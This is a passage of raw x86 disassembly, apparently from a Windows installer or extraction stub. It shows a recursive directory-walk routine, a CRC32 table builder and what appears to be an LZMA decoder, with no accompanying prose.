  406bbd:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  406bc1:	66 3b c7             	cmp    %di,%ax
  406bc4:	74 6b                	je     0x406c31
  406bc6:	66 83 f8 2e          	cmp    $0x2e,%ax
  406bca:	75 06                	jne    0x406bd2
  406bcc:	66 39 7e 04          	cmp    %di,0x4(%esi)
  406bd0:	74 5f                	je     0x406c31
  406bd2:	56                   	push   %esi
  406bd3:	ff 75 fc             	push   -0x4(%ebp)
  406bd6:	e8 f4 f3 ff ff       	call   0x405fcf
  406bdb:	f6 85 a4 fd ff ff 10 	testb  $0x10,-0x25c(%ebp)
  406be2:	74 15                	je     0x406bf9
  406be4:	8b 45 0c             	mov    0xc(%ebp),%eax
  406be7:	83 e0 03             	and    $0x3,%eax
  406bea:	3c 03                	cmp    $0x3,%al
  406bec:	75 43                	jne    0x406c31
  406bee:	ff 75 0c             	push   0xc(%ebp)
  406bf1:	53                   	push   %ebx
  406bf2:	e8 e8 fe ff ff       	call   0x406adf
  406bf7:	eb 38                	jmp    0x406c31
  406bf9:	53                   	push   %ebx
  406bfa:	e8 f6 f1 ff ff       	call   0x405df5
  406bff:	53                   	push   %ebx
  406c00:	ff 15 70 81 40 00    	call   *0x408170
  406c06:	85 c0                	test   %eax,%eax
  406c08:	75 1f                	jne    0x406c29
  406c0a:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  406c0e:	74 11                	je     0x406c21
  406c10:	53                   	push   %ebx
  406c11:	6a f1                	push   $0xfffffff1
  406c13:	e8 7a e2 ff ff       	call   0x404e92
  406c18:	57                   	push   %edi
  406c19:	53                   	push   %ebx
  406c1a:	e8 8d fe ff ff       	call   0x406aac
  406c1f:	eb 10                	jmp    0x406c31
  406c21:	ff 05 88 46 47 00    	incl   0x474688
  406c27:	eb 08                	jmp    0x406c31
  406c29:	53                   	push   %ebx
  406c2a:	6a f2                	push   $0xfffffff2
  406c2c:	e8 61 e2 ff ff       	call   0x404e92
  406c31:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  406c37:	50                   	push   %eax
  406c38:	ff 75 f8             	push   -0x8(%ebp)
  406c3b:	ff 15 68 81 40 00    	call   *0x408168
  406c41:	85 c0                	test   %eax,%eax
  406c43:	0f 85 4e ff ff ff    	jne    0x406b97
  406c49:	ff 75 f8             	push   -0x8(%ebp)
  406c4c:	ff 15 64 81 40 00    	call   *0x408164
  406c52:	eb 02                	jmp    0x406c56
  406c54:	33 ff                	xor    %edi,%edi
  406c56:	39 7d 08             	cmp    %edi,0x8(%ebp)
  406c59:	5f                   	pop    %edi
  406c5a:	74 09                	je     0x406c65
  406c5c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406c5f:	33 c0                	xor    %eax,%eax
  406c61:	66 89 41 fe          	mov    %ax,-0x2(%ecx)
  406c65:	33 f6                	xor    %esi,%esi
  406c67:	39 75 08             	cmp    %esi,0x8(%ebp)
  406c6a:	74 4d                	je     0x406cb9
  406c6c:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  406c6f:	74 38                	je     0x406ca9
  406c71:	53                   	push   %ebx
  406c72:	e8 a7 f4 ff ff       	call   0x40611e
  406c77:	85 c0                	test   %eax,%eax
  406c79:	74 3e                	je     0x406cb9
  406c7b:	53                   	push   %ebx
  406c7c:	e8 eb f8 ff ff       	call   0x40656c
  406c81:	53                   	push   %ebx
  406c82:	e8 6e f1 ff ff       	call   0x405df5
  406c87:	53                   	push   %ebx
  406c88:	ff 15 14 81 40 00    	call   *0x408114
  406c8e:	85 c0                	test   %eax,%eax
  406c90:	75 1f                	jne    0x406cb1
  406c92:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  406c96:	74 11                	je     0x406ca9
  406c98:	53                   	push   %ebx
  406c99:	6a f1                	push   $0xfffffff1
  406c9b:	e8 f2 e1 ff ff       	call   0x404e92
  406ca0:	56                   	push   %esi
  406ca1:	53                   	push   %ebx
  406ca2:	e8 05 fe ff ff       	call   0x406aac
  406ca7:	eb 10                	jmp    0x406cb9
  406ca9:	ff 05 88 46 47 00    	incl   0x474688
  406caf:	eb 08                	jmp    0x406cb9
  406cb1:	53                   	push   %ebx
  406cb2:	6a e5                	push   $0xffffffe5
  406cb4:	e8 d9 e1 ff ff       	call   0x404e92
  406cb9:	5e                   	pop    %esi
  406cba:	5b                   	pop    %ebx
  406cbb:	c9                   	leave
  406cbc:	c2 08 00             	ret    $0x8
  406cbf:	55                   	push   %ebp
  406cc0:	8b ec                	mov    %esp,%ebp
  406cc2:	83 3d 44 41 46 00 00 	cmpl   $0x0,0x464144
  406cc9:	75 32                	jne    0x406cfd
  406ccb:	33 c9                	xor    %ecx,%ecx
  406ccd:	56                   	push   %esi
  406cce:	6a 08                	push   $0x8
  406cd0:	8b c1                	mov    %ecx,%eax
  406cd2:	5e                   	pop    %esi
  406cd3:	8b d0                	mov    %eax,%edx
  406cd5:	80 e2 01             	and    $0x1,%dl
  406cd8:	0f b6 d2             	movzbl %dl,%edx
  406cdb:	f7 da                	neg    %edx
  406cdd:	1b d2                	sbb    %edx,%edx
  406cdf:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406ce5:	d1 e8                	shr    $1,%eax
  406ce7:	33 c2                	xor    %edx,%eax
  406ce9:	4e                   	dec    %esi
  406cea:	75 e7                	jne    0x406cd3
  406cec:	89 04 8d 40 41 46 00 	mov    %eax,0x464140(,%ecx,4)
  406cf3:	41                   	inc    %ecx
  406cf4:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406cfa:	7c d2                	jl     0x406cce
  406cfc:	5e                   	pop    %esi
  406cfd:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406d01:	8b 45 08             	mov    0x8(%ebp),%eax
  406d04:	f7 d0                	not    %eax
  406d06:	76 22                	jbe    0x406d2a
  406d08:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406d0b:	0f b6 11             	movzbl (%ecx),%edx
  406d0e:	ff 4d 10             	decl   0x10(%ebp)
  406d11:	33 d0                	xor    %eax,%edx
  406d13:	81 e2 ff 00 00 00    	and    $0xff,%edx
  406d19:	c1 e8 08             	shr    $0x8,%eax
  406d1c:	33 04 95 40 41 46 00 	xor    0x464140(,%edx,4),%eax
  406d23:	41                   	inc    %ecx
  406d24:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406d28:	77 e1                	ja     0x406d0b
  406d2a:	f7 d0                	not    %eax
  406d2c:	5d                   	pop    %ebp
  406d2d:	c2 0c 00             	ret    $0xc
  406d30:	b8 80 00 00 00       	mov    $0x80,%eax
  406d35:	48                   	dec    %eax
  406d36:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406d3a:	75 f9                	jne    0x406d35
  406d3c:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406d40:	33 c0                	xor    %eax,%eax
  406d42:	40                   	inc    %eax
  406d43:	89 41 68             	mov    %eax,0x68(%ecx)
  406d46:	89 41 64             	mov    %eax,0x64(%ecx)
  406d49:	89 41 60             	mov    %eax,0x60(%ecx)
  406d4c:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406d4f:	c3                   	ret
  406d50:	55                   	push   %ebp
  406d51:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  406d55:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406d5b:	56                   	push   %esi
  406d5c:	57                   	push   %edi
  406d5d:	8b f1                	mov    %ecx,%esi
  406d5f:	6a 22                	push   $0x22
  406d61:	59                   	pop    %ecx
  406d62:	8d 7d f0             	lea    -0x10(%ebp),%edi
  406d65:	89 75 e8             	mov    %esi,-0x18(%ebp)
  406d68:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406d6a:	83 7d 48 ff          	cmpl   $0xffffffff,0x48(%ebp)
  406d6e:	75 08                	jne    0x406d78
  406d70:	33 c0                	xor    %eax,%eax
  406d72:	40                   	inc    %eax
  406d73:	e9 bc 09 00 00       	jmp    0x407734
  406d78:	8b 75 24             	mov    0x24(%ebp),%esi
  406d7b:	53                   	push   %ebx
  406d7c:	8b 5d 34             	mov    0x34(%ebp),%ebx
  406d7f:	8b 55 74             	mov    0x74(%ebp),%edx
  406d82:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406d85:	83 f8 1c             	cmp    $0x1c,%eax
  406d88:	0f 87 a2 09 00 00    	ja     0x407730
  406d8e:	ff 24 85 3c 77 40 00 	jmp    *0x40773c(,%eax,4)
  406d95:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406d99:	0f 84 82 09 00 00    	je     0x407721
  406d9f:	8b 45 08             	mov    0x8(%ebp),%eax
  406da2:	ff 4d 0c             	decl   0xc(%ebp)
  406da5:	8a 00                	mov    (%eax),%al
  406da7:	ff 45 08             	incl   0x8(%ebp)
  406daa:	3c e1                	cmp    $0xe1,%al
  406dac:	0f 87 7e 09 00 00    	ja     0x407730
  406db2:	0f b6 c0             	movzbl %al,%eax
  406db5:	99                   	cltd
  406db6:	6a 2d                	push   $0x2d
  406db8:	59                   	pop    %ecx
  406db9:	f7 f9                	idiv   %ecx
  406dbb:	6a 09                	push   $0x9
  406dbd:	59                   	pop    %ecx
  406dbe:	8b f0                	mov    %eax,%esi
  406dc0:	0f b6 c2             	movzbl %dl,%eax
  406dc3:	99                   	cltd
  406dc4:	f7 f9                	idiv   %ecx
  406dc6:	8b ce                	mov    %esi,%ecx
  406dc8:	0f b6 fa             	movzbl %dl,%edi
  406dcb:	33 d2                	xor    %edx,%edx
  406dcd:	42                   	inc    %edx
  406dce:	d3 e2                	shl    %cl,%edx
  406dd0:	8b c8                	mov    %eax,%ecx
  406dd2:	89 7d 3c             	mov    %edi,0x3c(%ebp)
  406dd5:	4a                   	dec    %edx
  406dd6:	89 55 5c             	mov    %edx,0x5c(%ebp)
  406dd9:	33 d2                	xor    %edx,%edx
  406ddb:	42                   	inc    %edx
  406ddc:	d3 e2                	shl    %cl,%edx
  406dde:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406de1:	be 00 03 00 00       	mov    $0x300,%esi
  406de6:	d3 e6                	shl    %cl,%esi
  406de8:	4a                   	dec    %edx
  406de9:	89 55 60             	mov    %edx,0x60(%ebp)
  406dec:	81 c6 36 07 00 00    	add    $0x736,%esi
  406df2:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406df5:	3b 7d 00             	cmp    0x0(%ebp),%edi
  406df8:	74 26                	je     0x406e20
  406dfa:	83 7d 74 00          	cmpl   $0x0,0x74(%ebp)
  406dfe:	74 09                	je     0x406e09
  406e00:	ff 75 74             	push   0x74(%ebp)
  406e03:	ff 15 30 81 40 00    	call   *0x408130
  406e09:	57                   	push   %edi
  406e0a:	6a 40                	push   $0x40
  406e0c:	ff 15 24 81 40 00    	call   *0x408124
  406e12:	89 45 74             	mov    %eax,0x74(%ebp)
  406e15:	85 c0                	test   %eax,%eax
  406e17:	0f 84 13 09 00 00    	je     0x407730
  406e1d:	89 7d 00             	mov    %edi,0x0(%ebp)
  406e20:	85 f6                	test   %esi,%esi
  406e22:	74 0f                	je     0x406e33
  406e24:	8b 4d 74             	mov    0x74(%ebp),%ecx
  406e27:	4e                   	dec    %esi
  406e28:	b8 00 04 00 00       	mov    $0x400,%eax
  406e2d:	66 89 04 71          	mov    %ax,(%ecx,%esi,2)
  406e31:	75 f1                	jne    0x406e24
  406e33:	83 65 30 00          	andl   $0x0,0x30(%ebp)
  406e37:	83 65 38 00          	andl   $0x0,0x38(%ebp)
  406e3b:	eb 24                	jmp    0x406e61
  406e3d:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406e41:	0f 84 6a 08 00 00    	je     0x4076b1
  406e47:	8b 45 08             	mov    0x8(%ebp),%eax
  406e4a:	8b 4d 30             	mov    0x30(%ebp),%ecx
  406e4d:	0f b6 00             	movzbl (%eax),%eax
  406e50:	ff 4d 0c             	decl   0xc(%ebp)
  406e53:	c1 e1 03             	shl    $0x3,%ecx
  406e56:	d3 e0                	shl    %cl,%eax
  406e58:	09 45 38             	or     %eax,0x38(%ebp)
  406e5b:	ff 45 08             	incl   0x8(%ebp)
  406e5e:	ff 45 30             	incl   0x30(%ebp)
  406e61:	83 7d 30 04          	cmpl   $0x4,0x30(%ebp)
  406e65:	7c d6                	jl     0x406e3d
  406e67:	8b 45 38             	mov    0x38(%ebp),%eax
  406e6a:	3b 45 04             	cmp    0x4(%ebp),%eax
  406e6d:	74 28                	je     0x406e97
  406e6f:	83 7d 70 00          	cmpl   $0x0,0x70(%ebp)
  406e73:	89 45 04             	mov    %eax,0x4(%ebp)
  406e76:	74 09                	je     0x406e81
  406e78:	ff 75 70             	push   0x70(%ebp)
  406e7b:	ff 15 30 81 40 00    	call   *0x408130
  406e81:	ff 75 38             	push   0x38(%ebp)
  406e84:	6a 40                	push   $0x40
  406e86:	ff 15 24 81 40 00    	call   *0x408124
  406e8c:	89 45 70             	mov    %eax,0x70(%ebp)
  406e8f:	85 c0                	test   %eax,%eax
  406e91:	0f 84 99 08 00 00    	je     0x407730
  406e97:	8b 45 70             	mov    0x70(%ebp),%eax
  406e9a:	8b 4d 04             	mov    0x4(%ebp),%ecx
  406e9d:	c6 44 08 ff 00       	movb   $0x0,-0x1(%eax,%ecx,1)
  406ea2:	c7 45 30 05 00 00 00 	movl   $0x5,0x30(%ebp)
  406ea9:	eb 21                	jmp    0x406ecc
  406eab:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406eaf:	0f 84 05 08 00 00    	je     0x4076ba
  406eb5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406eb8:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406ebb:	0f b6 09             	movzbl (%ecx),%ecx
  406ebe:	ff 4d 0c             	decl   0xc(%ebp)
  406ec1:	c1 e0 08             	shl    $0x8,%eax
  406ec4:	0b c1                	or     %ecx,%eax
  406ec6:	ff 45 08             	incl   0x8(%ebp)
  406ec9:	89 45 6c             	mov    %eax,0x6c(%ebp)
  406ecc:	8b 45 30             	mov    0x30(%ebp),%eax
  406ecf:	ff 4d 30             	decl   0x30(%ebp)
  406ed2:	85 c0                	test   %eax,%eax
  406ed4:	75 d5                	jne    0x406eab
  406ed6:	8b 55 74             	mov    0x74(%ebp),%edx
  406ed9:	8b 45 18             	mov    0x18(%ebp),%eax
  406edc:	23 45 5c             	and    0x5c(%ebp),%eax
  406edf:	8b 4d 40             	mov    0x40(%ebp),%ecx
  406ee2:	c1 e1 04             	shl    $0x4,%ecx
  406ee5:	03 c8                	add    %eax,%ecx
  406ee7:	89 45 2c             	mov    %eax,0x2c(%ebp)
  406eea:	8d 34 4a             	lea    (%edx,%ecx,2),%esi
  406eed:	c7 45 f4 06 00 00 00 	movl   $0x6,-0xc(%ebp)
  406ef4:	e9 33 06 00 00       	jmp    0x40752c
  406ef9:	33 c0                	xor    %eax,%eax
  406efb:	39 45 38             	cmp    %eax,0x38(%ebp)
  406efe:	75 6d                	jne    0x406f6d
  406f00:	0f b6 75 1c          	movzbl 0x1c(%ebp),%esi
  406f04:	8b 7d 18             	mov    0x18(%ebp),%edi
  406f07:	23 7d 60             	and    0x60(%ebp),%edi
  406f0a:	6a 08                	push   $0x8
  406f0c:	59                   	pop    %ecx
  406f0d:	2a 4d 3c             	sub    0x3c(%ebp),%cl
  406f10:	d3 ee                	shr    %cl,%esi
  406f12:	8b 4d 3c             	mov    0x3c(%ebp),%ecx
  406f15:	d3 e7                	shl    %cl,%edi
  406f17:	03 f7                	add    %edi,%esi
  406f19:	69 f6 00 06 00 00    	imul   $0x600,%esi,%esi
  406f1f:	83 7d 40 04          	cmpl   $0x4,0x40(%ebp)
  406f23:	8d 8c 16 6c 0e 00 00 	lea    0xe6c(%esi,%edx,1),%ecx
  406f2a:	89 4d 20             	mov    %ecx,0x20(%ebp)
  406f2d:	7d 05                	jge    0x406f34
  406f2f:	89 45 40             	mov    %eax,0x40(%ebp)
  406f32:	eb 10                	jmp    0x406f44
  406f34:	83 7d 40 0a          	cmpl   $0xa,0x40(%ebp)
  406f38:	7d 06                	jge    0x406f40
  406f3a:	83 6d 40 03          	subl   $0x3,0x40(%ebp)
  406f3e:	eb 04                	jmp    0x406f44
  406f40:	83 6d 40 06          	subl   $0x6,0x40(%ebp)
  406f44:	39 45 44             	cmp    %eax,0x44(%ebp)
  406f47:	74 1c                	je     0x406f65
  406f49:	8b 45 64             	mov    0x64(%ebp),%eax
  406f4c:	2b 45 4c             	sub    0x4c(%ebp),%eax
  406f4f:	3b 45 04             	cmp    0x4(%ebp),%eax
  406f52:	72 03                	jb     0x406f57
  406f54:	03 45 04             	add    0x4(%ebp),%eax
  406f57:	8b 4d 70             	mov    0x70(%ebp),%ecx
  406f5a:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406f5d:	33 db                	xor    %ebx,%ebx
  406f5f:	88 45 1d             	mov    %al,0x1d(%ebp)
  406f62:	43                   	inc    %ebx
  406f63:	eb 62                	jmp    0x406fc7
  406f65:	33 db                	xor    %ebx,%ebx
  406f67:	43                   	inc    %ebx
  406f68:	e9 c9 01 00 00       	jmp    0x407136
  406f6d:	8b 45 40             	mov    0x40(%ebp),%eax
  406f70:	c7 45 44 01 00 00 00 	movl   $0x1,0x44(%ebp)
  406f77:	8d b4 42 80 01 00 00 	lea    0x180(%edx,%eax,2),%esi
  406f7e:	c7 45 f4 07 00 00 00 	movl   $0x7,-0xc(%ebp)
  406f85:	e9 a2 05 00 00       	jmp    0x40752c
  406f8a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406f8e:	0f 84 2f 07 00 00    	je     0x4076c3
  406f94:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406f97:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406f9a:	0f b6 09             	movzbl (%ecx),%ecx
  406f9d:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  406fa1:	ff 4d 0c             	decl   0xc(%ebp)
  406fa4:	c1 e0 08             	shl    $0x8,%eax
  406fa7:	0b c1                	or     %ecx,%eax
  406fa9:	ff 45 08             	incl   0x8(%ebp)
  406fac:	89 45 6c             	mov    %eax,0x6c(%ebp)
  406faf:	8b 45 38             	mov    0x38(%ebp),%eax
  406fb2:	39 45 30             	cmp    %eax,0x30(%ebp)
  406fb5:	0f 85 ae 00 00 00    	jne    0x407069
  406fbb:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406fc1:	0f 8d 07 01 00 00    	jge    0x4070ce
  406fc7:	0f b6 45 1d          	movzbl 0x1d(%ebp),%eax
  406fcb:	d0 65 1d             	shlb   $1,0x1d(%ebp)
  406fce:	8b 4d 20             	mov    0x20(%ebp),%ecx
  406fd1:	c1 e8 07             	shr    $0x7,%eax
  406fd4:	89 45 30             	mov    %eax,0x30(%ebp)
  406fd7:	40                   	inc    %eax
  406fd8:	c1 e0 08             	shl    $0x8,%eax
  406fdb:	03 c3                	add    %ebx,%eax
  406fdd:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406fe0:	0f b7 06             	movzwl (%esi),%eax
  406fe3:	8b 4d 68             	mov    0x68(%ebp),%ecx
  406fe6:	0f b7 d0             	movzwl %ax,%edx
  406fe9:	c1 e9 0b             	shr    $0xb,%ecx
  406fec:	0f af ca             	imul   %edx,%ecx
  406fef:	89 75 24             	mov    %esi,0x24(%ebp)
  406ff2:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  406ff5:	73 1a                	jae    0x407011
  406ff7:	83 65 38 00          	andl   $0x0,0x38(%ebp)
  406ffb:	89 4d 68             	mov    %ecx,0x68(%ebp)
  406ffe:	b9 00 08 00 00       	mov    $0x800,%ecx
  407003:	2b ca                	sub    %edx,%ecx
  407005:	c1 f9 05             	sar    $0x5,%ecx
  407008:	03 c8                	add    %eax,%ecx
  40700a:	66 89 0e             	mov    %cx,(%esi)
  40700d:	03 db                	add    %ebx,%ebx
  40700f:	eb 1e                	jmp    0x40702f
  407011:	29 4d 68             	sub    %ecx,0x68(%ebp)
  407014:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  407017:	66 8b c8             	mov    %ax,%cx
  40701a:	66 c1 e9 05          	shr    $0x5,%cx
  40701e:	66 2b c1             	sub    %cx,%ax
  407021:	c7 45 38 01 00 00 00 	movl   $0x1,0x38(%ebp)
  407028:	66 89 06             	mov    %ax,(%esi)
  40702b:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  40702f:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  407036:	89 5d 34             	mov    %ebx,0x34(%ebp)
  407039:	0f 83 70 ff ff ff    	jae    0x406faf
  40703f:	e9 46 ff ff ff       	jmp    0x406f8a
  407044:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  407048:	0f 84 7e 06 00 00    	je     0x4076cc
  40704e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407051:	8b 45 6c             	mov    0x6c(%ebp),%eax
  407054:	0f b6 09             	movzbl (%ecx),%ecx
  407057:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  40705b:	ff 4d 0c             	decl   0xc(%ebp)
  40705e:	c1 e0 08             	shl    $0x8,%eax
  407061:	0b c1                	or     %ecx,%eax
  407063:	ff 45 08             	incl   0x8(%ebp)
  407066:	89 45 6c             	mov    %eax,0x6c(%ebp)
  407069:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40706f:	7d 5d                	jge    0x4070ce
  407071:	8b 45 20             	mov    0x20(%ebp),%eax
  407074:	8b 4d 68             	mov    0x68(%ebp),%ecx
  407077:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40707a:	8d 34 02             	lea    (%edx,%eax,1),%esi
  40707d:	0f b7 06             	movzwl (%esi),%eax
  407080:	0f b7 f8             	movzwl %ax,%edi
  407083:	c1 e9 0b             	shr    $0xb,%ecx
  407086:	0f af cf             	imul   %edi,%ecx
  407089:	89 75 24             	mov    %esi,0x24(%ebp)
  40708c:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  40708f:	73 16                	jae    0x4070a7
  407091:	89 4d 68             	mov    %ecx,0x68(%ebp)
  407094:	b9 00 08 00 00       	mov    $0x800,%ecx
  407099:	2b cf                	sub    %edi,%ecx
  40709b:	c1 f9 05             	sar    $0x5,%ecx
  40709e:	03 c8                	add    %eax,%ecx
  4070a0:	66 89 0e             	mov    %cx,(%esi)
  4070a3:	03 db                	add    %ebx,%ebx
  4070a5:	eb 16                	jmp    0x4070bd
  4070a7:	29 4d 68             	sub    %ecx,0x68(%ebp)
  4070aa:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  4070ad:	66 8b c8             	mov    %ax,%cx
  4070b0:	66 c1 e9 05          	shr    $0x5,%cx
  4070b4:	66 2b c1             	sub    %cx,%ax
  4070b7:	66 89 06             	mov    %ax,(%esi)
  4070ba:	8d 5a 01             	lea    0x1(%edx),%ebx
  4070bd:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  4070c4:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4070c7:	73 a0                	jae    0x407069
  4070c9:	e9 76 ff ff ff       	jmp    0x407044
  4070ce:	83 65 44 00          	andl   $0x0,0x44(%ebp)
  4070d2:	8a 45 34             	mov    0x34(%ebp),%al
  4070d5:	88 45 1c             	mov    %al,0x1c(%ebp)
  4070d8:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4070dc:	0f 84 fc 05 00 00    	je     0x4076de
  4070e2:	8a 45 1c             	mov    0x1c(%ebp),%al
  4070e5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4070e8:	8b 55 70             	mov    0x70(%ebp),%edx
  4070eb:	ff 45 18             	incl   0x18(%ebp)
  4070ee:	ff 45 10             	incl   0x10(%ebp)
  4070f1:	ff 4d 14             	decl   0x14(%ebp)
  4070f4:	88 01                	mov    %al,(%ecx)
  4070f6:	8b 4d 64             	mov    0x64(%ebp),%ecx
  4070f9:	88 04 11             	mov    %al,(%ecx,%edx,1)
  4070fc:	8d 41 01             	lea    0x1(%ecx),%eax
  4070ff:	33 d2                	xor    %edx,%edx
  407101:	f7 75 04             	divl   0x4(%ebp)
  407104:	e9 7d 01 00 00       	jmp    0x407286
  407109:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40710d:	0f 84 c2 05 00 00    	je     0x4076d5
  407113:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407116:	8b 45 6c             	mov    0x6c(%ebp),%eax
  407119:	0f b6 09             	movzbl (%ecx),%ecx
  40711c:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  407120:	ff 4d 0c             	decl   0xc(%ebp)
  407123:	c1 e0 08             	shl    $0x8,%eax
  407126:	0b c1                	or     %ecx,%eax
  407128:	ff 45 08             	incl   0x8(%ebp)
  40712b:	89 45 6c             	mov    %eax,0x6c(%ebp)
  40712e:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  407134:	7d 9c                	jge    0x4070d2
  407136:	8b 45 20             	mov    0x20(%ebp),%eax
  407139:	8b 4d 68             	mov    0x68(%ebp),%ecx
  40713c:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40713f:	8d 34 02             	lea    (%edx,%eax,1),%esi
  407142:	0f b7 06             	movzwl (%esi),%eax
  407145:	0f b7 f8             	movzwl %ax,%edi
  407148:	c1 e9 0b             	shr    $0xb,%ecx
  40714b:	0f af cf             	imul   %edi,%ecx
  40714e:	89 75 24             	mov    %esi,0x24(%ebp)
  407151:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  407154:	73 16                	jae    0x40716c
  407156:	89 4d 68             	mov    %ecx,0x68(%ebp)
  407159:	b9 00 08 00 00       	mov    $0x800,%ecx
  40715e:	2b cf                	sub    %edi,%ecx
  407160:	c1 f9 05             	sar    $0x5,%ecx
  407163:	03 c8                	add    %eax,%ecx
  407165:	66 89 0e             	mov    %cx,(%esi)
  407168:	03 db                	add    %ebx,%ebx
  40716a:	eb 16                	jmp    0x407182
  40716c:	29 4d 68             	sub    %ecx,0x68(%ebp)
  40716f:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  407172:	66 8b c8             	mov    %ax,%cx
  407175:	66 c1 e9 05          	shr    $0x5,%cx
  407179:	66 2b c1             	sub    %cx,%ax
  40717c:	66 89 06             	mov    %ax,(%esi)
  40717f:	8d 5a 01             	lea    0x1(%edx),%ebx
  407182:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  407189:	89 5d 34             	mov    %ebx,0x34(%ebp)
  40718c:	73 a0                	jae    0x40712e
  40718e:	e9 76 ff ff ff       	jmp    0x407109
  407193:	83 7d 38 01          	cmpl   $0x1,0x38(%ebp)
  407197:	75 16                	jne    0x4071af
  407199:	8b 45 40             	mov    0x40(%ebp),%eax
  40719c:	8d b4 42 98 01 00 00 	lea    0x198(%edx,%eax,2),%esi
  4071a3:	c7 45 f4 08 00 00 00 	movl   $0x8,-0xc(%ebp)
  4071aa:	e9 7d 03 00 00       	jmp    0x40752c
  4071af:	8b 45 54             	mov    0x54(%ebp),%eax
  4071b2:	89 45 58             	mov    %eax,0x58(%ebp)
  4071b5:	8b 45 50             	mov    0x50(%ebp),%eax
  4071b8:	89 45 54             	mov    %eax,0x54(%ebp)
  4071bb:	8b 45 4c             	mov    0x4c(%ebp),%eax
  4071be:	89 45 50             	mov    %eax,0x50(%ebp)
  4071c1:	33 c0                	xor    %eax,%eax
  4071c3:	83 7d 40 07          	cmpl   $0x7,0x40(%ebp)
  4071c7:	c7 45 f8 16 00 00 00 	movl   $0x16,-0x8(%ebp)
  4071ce:	0f 9d c0             	setge  %al
  4071d1:	48                   	dec    %eax
  4071d2:	83 e0 fd             	and    $0xfffffffd,%eax
  4071d5:	83 c0 0a             	add    $0xa,%eax
  4071d8:	89 45 40             	mov    %eax,0x40(%ebp)
  4071db:	8d 82 64 06 00 00    	lea    0x664(%edx),%eax
  4071e1:	89 45 20             	mov    %eax,0x20(%ebp)
  4071e4:	8b 75 20             	mov    0x20(%ebp),%esi
  4071e7:	c7 45 f4 12 00 00 00 	movl   $0x12,-0xc(%ebp)
  4071ee:	e9 39 03 00 00       	jmp    0x40752c
  4071f3:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  4071f7:	8b 45 40             	mov    0x40(%ebp),%eax
  4071fa:	75 18                	jne    0x407214
  4071fc:	83 c0 0f             	add    $0xf,%eax
  4071ff:	c1 e0 04             	shl    $0x4,%eax
  407202:	03 45 2c             	add    0x2c(%ebp),%eax
  407205:	c7 45 f4 09 00 00 00 	movl   $0x9,-0xc(%ebp)
  40720c:	8d 34 42             	lea    (%edx,%eax,2),%esi
  40720f:	e9 18 03 00 00       	jmp    0x40752c
  407214:	8d b4 42 b0 01 00 00 	lea    0x1b0(%edx,%eax,2),%esi
  40721b:	c7 45 f4 0a 00 00 00 	movl   $0xa,-0xc(%ebp)
  407222:	e9 05 03 00 00       	jmp    0x40752c
  407227:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  40722b:	0f 85 a8 00 00 00    	jne    0x4072d9
  407231:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  407235:	0f 84 f5 04 00 00    	je     0x407730
  40723b:	33 c0                	xor    %eax,%eax
  40723d:	83 7d 40 07          	cmpl   $0x7,0x40(%ebp)
  407241:	0f 9d c0             	setge  %al
  407244:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  407248:	89 45 40             	mov    %eax,0x40(%ebp)
  40724b:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40724f:	0f 84 92 04 00 00    	je     0x4076e7
